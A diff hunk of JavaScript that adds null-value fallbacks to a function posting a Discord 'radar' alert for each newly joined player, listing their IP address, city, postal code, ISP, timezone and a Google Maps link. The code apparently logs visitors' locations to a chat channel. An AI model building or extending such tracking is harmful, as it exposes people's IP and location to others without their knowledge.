@@ -52,11 +52,11 @@ async function sendDiscordRadarAlert(d) {
             description: `Ein neuer Spieler ist live beigetreten.`,
             color: 3447003, // Blau
             fields: [
-                { name: "📍 Ort", value: `${d.city} (${d.zip}), ${d.regionName}`, inline: true },
-                { name: "🏳️ Land", value: `${d.country} :flag_${d.countryCode.toLowerCase()}:`, inline: true },
-                { name: "📶 Anbieter", value: `${d.isp}`, inline: false },
-                { name: "🌐 IP-Adresse", value: `||${d.query}||`, inline: true },
-                { name: "🕒 Zeitzone", value: `${d.timezone}`, inline: true },
+                { name: "📍 Ort", value: `${d.city || 'Unbekannt'} (${d.zip || 'N/A'}), ${d.regionName || 'Unbekannt'}`, inline: true },
+                { name: "🏳️ Land", value: `${d.country || 'Unbekannt'} :flag_${(d.countryCode || 'un').toLowerCase()}:`, inline: true },
+                { name: "📶 Anbieter", value: `${d.isp || 'Unbekannt'}`, inline: false },
+                { name: "🌐 IP-Adresse", value: `||${d.query || 'Unbekannt'}||`, inline: true },
+                { name: "🕒 Zeitzone", value: `${d.timezone || 'Unbekannt'}`, inline: true },
                 { name: "🗺️ Karte", value: `[Auf Google Maps anzeigen](${mapsLink})`, inline: false }
             ],
             footer: { text: "System-Sicherheit: Standort-Analyse aktiv" },
